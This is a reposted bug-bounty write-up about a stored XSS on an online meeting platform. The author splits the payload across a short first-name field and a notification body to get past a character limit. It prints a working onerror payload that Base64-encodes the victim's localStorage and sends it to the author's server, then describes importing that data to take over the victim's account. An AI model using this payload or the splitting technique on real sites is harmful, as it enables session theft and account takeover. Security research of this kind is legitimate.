# :globe_with_meridians: Bypassing Character Limit - XSS Using Spanned Payload

> **Original Source:** [Bypassing Character Limit - XSS Using Spanned Payload](https://infosecwriteups.com/bypassing-character-limit-xss-using-spanned-payload-7301ffac226e)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Bypassing Character Limit - XSS Using Spanned Payload


Hello, I am Syed Mushfik Hasan Tahsin aka [SMHTahsin33](https://twitter.com/SMHTahsin33), an 18 Y/O Cyber Security Enthusiast from Bangladesh. I am into Infosec due to curiosity and I do bug bounties in free time. Working in this sector for about 3+ Years now.


Knowing your Target (Initial Recon : Mapping Functions)


The first thing when I get started with my target, the thing I do is learning the target like what it is made for, how someone uses the web application, what functions it has… etc
The website was used for presentations or meetings online with a good looking UI. One meeting can have 1000 participants. There were 4 user roles- Moderator, Presenter, Participant & Guest. The full website was loaded dynamically on the client side with JS.


Along with all the other functions the thing that caught my eyes while comparing the user roles that, the Moderator role had an extra feature called Notifications. And I already had a few other user inputs there that could reflect in different places but didn’t have any luck with those.


Poking the Suspects


When I sent a notification there I saw that the First Name of the user was being reflected in the Notification Popup without getting filtered. When I tried to inject a payload in the First name field I observed that it was only allowing 15 characters and as <script> won’t be working there, so had no ways to exploit that. The Notification body didn’t allow any angle brackets <>


Bypassing The Character Limit to achieve a popup!


The FNAME — Admin part is unfiltered and allows special characters and the NOTIFICATION BODY is fully filtered with an allowance of 88characters max. When I was scrolling through this I hit up with, can’t we just use both as a one? ;)


Why not! as the FNAME allowed us special characters and also limited the input at 15 characters at the same time it wasn’t possible to use that at once, so the thing I did was injected <img src=’ on the FNAME Input which led the part from -Admin</span>…</div> to get inside that single quotation, and as it also didn’t have any single quotation in the middle it didn’t break out.


## Get SMHTahsin33’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Ok, so lets come to the point about the popup? As the body of the notification was allowing single quotes and double quotes, I just started the body of the notification with a single quotation, which enclosed the contents in the middle after the FNAME inside the src attritubute of the img tag. As these tags are a non-existent source of image the value of the src is now false and caused error, here where onerror comes to play :D
I injected onerror=alert() after the single quotation in the body which made the whole thing look like this.


Yes, the browser added the “” around the alert() by itself and also adjusted the quotations automatically on client side after injection making some modifications on it’s own leading to the popup alert.


Data Exfiltration For Account Takeover


This was using LocalStorage to store all the session information. SoI needed to exfiltrate the data to my server. There were some URL Fragment or # in the session values which interrupted the data exfiltration using the GET parameter, I wasn’t able to use the [encodeURIComponent()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent) because of the character limit of the notification body. After a while searching for an alternative, ended up using btoa() to exfiltrate the Base64 Encoded version of the LocalStorage. The payload used in the body was:

>

‘ onerror=’new Image().src=`//127.0.0.1/?s=${btoa(JSON.stringify(localStorage))}`’


When the onerror triggered, it sent a request to my server with the LocalStorage data of the victim who was inside that meeting!


Just decoded it and used [LocalStorage Manager](https://chrome.google.com/webstore/detail/localstorage-manager/fkhoimdhngkiicbjobkinobjkoefhkap) Extension to import these data to my browser.


Then reloaded the website and I was inside the Victims Account :)


Thanks for reading, hope you enjoyed the writeup. Don’t forget to Share 😄

---

*Originally published on [Medium](https://infosecwriteups.com/bypassing-character-limit-xss-using-spanned-payload-7301ffac226e). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
